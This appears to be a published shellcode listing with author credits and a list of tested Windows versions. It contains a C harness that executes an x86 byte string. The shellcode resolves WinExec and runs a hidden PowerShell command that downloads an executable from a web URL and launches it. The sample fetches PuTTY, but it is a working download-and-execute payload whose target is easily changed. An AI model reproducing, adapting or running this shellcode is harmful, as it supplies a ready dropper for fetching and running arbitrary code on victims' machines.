[+] Author  : B3mB4m
[~] Contact : b3mb4m@protonmail.com
[~] Project : https://github.com/b3mb4m/shellsploit-framework
[~] Greetz  : Bomberman,T-Rex,Pixi
-----------------------------------------------------------

Tested on : 
    Windows XP/SP3 x86
    Windows 7 Ultimate x64  
    Windows 8.1 Pro Build 9600 x64
    Windows 10 Home x64


#include<stdio.h>
 
char shellcode[]=\
 
"\x31\xc9\xb9\x57\x69\x6e\x45\xeb\x04\x31\xc9\xeb\x00\x31\xc0\x31\xdb\x31\xd2\x31\xff\x31\xf6\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x81\xf9\x57\x69\x6e\x45\x0f\x85\x30\x01\x00\x00\x8b\x34\xaf\x01\xc6\x45\x39\x0e\x75\xf6\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x29\x3b\x7d\x22\x68\x65\x78\x65\x27\x68\x74\x74\x79\x2e\x68\x28\x27\x70\x75\x68\x63\x75\x74\x65\x68\x6c\x45\x78\x65\x68\x53\x68\x65\x6c\x68\x6f\x6e\x29\x2e\x68\x63\x61\x74\x69\x68\x70\x70\x6c\x69\x68\x6c\x6c\x2e\x41\x68\x20\x53\x68\x65\x68\x2d\x63\x6f\x6d\x68\x65\x63\x74\x20\x68\x2d\x4f\x62\x6a\x68\x28\x4e\x65\x77\x68\x27\x29\x20\x3b\x68\x2e\x65\x78\x65\x68\x75\x74\x74\x79\x68\x2c\x20\x27\x70\x68\x65\x78\x65\x27\x68\x74\x74\x79\x2e\x68\x36\x2f\x70\x75\x68\x74\x2f\x78\x38\x68\x61\x74\x65\x73\x68\x74\x79\x2f\x6c\x68\x2f\x70\x75\x74\x68\x74\x68\x61\x6d\x68\x73\x67\x74\x61\x68\x6c\x69\x2f\x7e\x68\x72\x74\x68\x2e\x68\x65\x2e\x65\x61\x68\x2f\x2f\x74\x68\x68\x74\x70\x73\x3a\x68\x28\x27\x68\x74\x68\x46\x69\x6c\x65\x68\x6c\x6f\x61\x64\x68\x44\x6f\x77\x6e\x68\x6e\x74\x29\x2e\x68\x43\x6c\x69\x65\x68\x2e\x57\x65\x62\x68\x20\x4e\x65\x74\x68\x6a\x65\x63\x74\x68\x77\x2d\x4f\x62\x68\x20\x28\x4e\x65\x68\x22\x26\x20\x7b\x68\x61\x6e\x64\x20\x68\x63\x6f\x6d\x6d\x68\x6c\x6c\x20\x2d\x68\x72\x73\x68\x65\x68\x70\x6f\x77\x65\x89\xe2\x41\x51\x52\xff\xd7\xe8\x8d\xfe\xff\xff\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x45\x78\x69\x74\x75\xf2\x81\x7e\x04\x50\x72\x6f\x63\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x31\xc9\x51\xff\xd7";
 
main(){(* (int(*)()) shellcode)();}
